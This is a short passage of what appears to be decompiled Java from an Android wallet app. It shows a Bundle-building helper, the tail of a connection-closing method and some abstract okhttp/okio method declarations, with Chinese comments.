                    var0.closeConnection(var0.closeMessage, var0.closedByRemote, var0.closeCode);
                }
            }
        }
        return true;
    }

    /** a(BundleArg) — Bundle 构建 (BundleArg 变参版) */
    public static Bundle a(com.guard.wallet.action.BundleArg... args) {
        Bundle bundle = new Bundle();
        for (com.guard.wallet.action.BundleArg item : args) {
            item.apply(bundle);
        }
        return bundle;
    }

    // ═══════ 抽象方法 (vendor abstract) ═══════

    public abstract void V(okio.BufferedSink var1) throws java.io.IOException;
    public abstract List f(String var1, List var2);
    public abstract long i() throws java.io.IOException;
    public abstract okhttp3.MediaType j();
}
